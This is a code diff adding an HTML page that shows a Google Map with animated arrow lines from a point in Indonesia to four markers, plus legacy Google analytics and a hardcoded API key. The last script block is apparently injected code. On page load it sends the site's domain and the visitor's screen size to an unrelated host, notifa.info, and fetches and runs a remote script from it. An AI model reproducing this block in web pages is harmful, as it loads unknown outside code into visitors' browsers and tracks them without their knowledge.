@@ -1,0 +1,115 @@
+
+<html>
+<head>
+<style type="text/css">
+html {
+  height: 100%;
+  width: 100%;
+}
+body {
+  height: 100%;
+  width:  100%
+  margin: 0;
+  padding: 0
+}
+#map_canvas {
+  height: 100%;
+  width: 100%;
+}
+</style>
+<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB4-lf1Di7j6hQU9-7ycvYLjqoGsXCqE-c&sensor=false&libraries=visualization"></script>
+<script language="javascript">
+ var line;
+ var lines = [];
+ var myLatlng = new google.maps.LatLng(41.7833, 5.2167);
+ var marker;
+function initialize(){
+ 
+
+var symbolOne = {
+  strokeColor: '#F00',
+  fillColor: '#F00',
+  fillOpacity: 1
+};
+
+var domain = [new google.maps.LatLng(0.556378, 123.063656)];
+var markers = [];
+
+var mapOptions = {
+  zoom:2,
+  center: myLatlng, 
+  mapTypeId: google.maps.MapTypeId.ROADMAP, 
+  opacity: 0.2, 
+
+  draggable: true, 
+};
+
+map = new google.maps.Map(document.getElementById("map_canvas"), mapOptions);
+var myLatLng = {lat: 0.556378, lng: 123.063656};
+var marker = new google.maps.Marker({
+          position: myLatLng,
+          map: map,
+          title: 'Hello World!'
+        }); 
+var lineCoordinates = [
+  new google.maps.LatLng(34.564663, 104.716032),
+  new google.maps.LatLng(42.948550, 12.464625),
+  new google.maps.LatLng(36.580371, 138.129518), 
+  new google.maps.LatLng(35.280757, 134.650093), 
+];
+
+var lineSymbol = {
+    path: google.maps.SymbolPath.FORWARD_CLOSED_ARROW                  
+};
+
+for(i=0;i<lineCoordinates.length;i++){ 
+  markers.push(new google.maps.Marker({
+    position: lineCoordinates[i],
+    map: map,
+	title: '1'
+  }));
+
+line = new google.maps.Polyline({
+  path: [domain[0], lineCoordinates[i]],
+  strokeOpacity: 0.8,
+  strokeWeight:2,
+  strokeColor: '#4287f5',
+  geodesic: true,
+  icons: [{
+    icon: lineSymbol,
+    offset: '100%',
+    repeat: '30px'
+  }]
+});
+ line.setMap(map);
+ lines.push(line);
+} //end of for loop
+// alert(lines.length);
+animate();
+
+} //end of initialize function
+
+function animate(){
+  var count = 0;
+  offsetId = window.setInterval(function(){
+    count = (count + 1) % 2000;
+    for (var i=0; i<lines.length; i++) {
+     var icons = lines[i].get('icons');
+     icons[0].offset = (count / 2) + '%';
+     lines[i].set('icons', icons);
+    }
+  }, 200);
+}// end of animate function
+</script>
+</head>
+<body onLoad="initialize()">
+    <div id="map_canvas" style="width: 100%; height: 100%; "></div>  
+</select>   
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"> 
+</script> 
+<script type="text/javascript"> 
+_uacct = "UA-162157-1";
+urchinTracker();
+</script> 
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprARABqmSBOxn4vHOboCsScqICPKKYXHYQgdXUOQiS7gEq8mSVbfLtFW57aAzXcSDRJbswJsLKt0D6FAkxy6RwxX2Z%2fbUzNR%2b2EWfizjRQ2kzbPxIlnZcAr3GUFjaBvqHigU8JMNe6VjtNpNyE93K4e6%2b2MJrQCeAnAfuy7OjTXyepEuNdxqHJOIqFCp%2bPhIcNDoKFA%2biHUe6AgS51Er7ogQ5K0y84%2ft4zHsulsmp7hgb%2bhxDVImjO1hR1YgeMwqO450XCR3LIn%2bmo8MGQLJCmAuyS25R%2b%2byi0OHygm0Fdyr1qjF%2fhEkNIrhzEFzcSSs6aWjLdhpxgKzsLPREJr%2bBAI%2f4sHcsWcMSHb1kIWTWFRHQokTMsEinAOZcrO3wV4%2fqY3VFBIa32FUPRVMqg84LVJUG3k2rq0jgIY36jKXUw6mcAkQIirkFVtVqtHurA6Y2WwyX851Lv3rVX18Gk5%2bflw0l8ceQmDkDUVZKOXrw0O77cwtgquKHDmX%2fKmeiCJAE6oxchQo0%2fEVEbnEbtbhhqd0dfB9vMrcftnqdbIuF%2fag5gjsqaIay7Ns7Aj6kls%2bLs0fRLbXQWgk3mA2WX1IdSTSClaZcuZKS7n" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
